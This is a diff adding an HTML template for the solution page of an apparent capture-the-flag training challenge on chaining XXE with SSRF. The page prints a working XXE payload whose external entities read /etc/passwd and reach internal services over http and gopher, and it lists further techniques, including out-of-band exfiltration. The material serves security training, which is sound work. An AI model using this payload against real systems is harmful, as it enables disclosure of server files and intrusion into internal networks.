@@ -1,0 +1,47 @@
+{% extends 'base.html' %}
+
+{% block title %}SSRF Level 9 Solution - R00tGlyph{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-10 offset-md-1">
+        <div class="card">
+            <div class="card-header bg-dark text-white">
+                <h2 class="text-center">SSRF Level 9 Solution: SSRF via XXE</h2>
+            </div>
+            <div class="card-body">
+                <h3>Solution</h3>
+                <p>This challenge demonstrates chaining XXE with SSRF for advanced exploitation techniques.</p>
+
+                <h4>XXE to SSRF Payload:</h4>
+                <div class="card bg-dark text-light mb-3">
+                    <div class="card-body">
+                        <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:80"&gt;
+  &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
+  &lt;!ENTITY gopher SYSTEM "gopher://127.0.0.1:80"&gt;
+]&gt;
+&lt;root&gt;
+  &lt;data&gt;&amp;xxe;&lt;/data&gt;
+&lt;/root&gt;</code></pre>
+                    </div>
+                </div>
+
+                <h4>Advanced XXE Techniques:</h4>
+                <ul>
+                    <li>File system access via file:// protocol</li>
+                    <li>Gopher protocol for advanced SSRF</li>
+                    <li>Out-of-band data exfiltration</li>
+                    <li>Parameter entity attacks</li>
+                </ul>
+
+                <div class="text-center mt-4">
+                    <a href="/ssrf/level9" class="btn btn-primary me-2">Try Challenge Again</a>
+                    <a href="/ssrf/level10" class="btn btn-success">Next Challenge</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
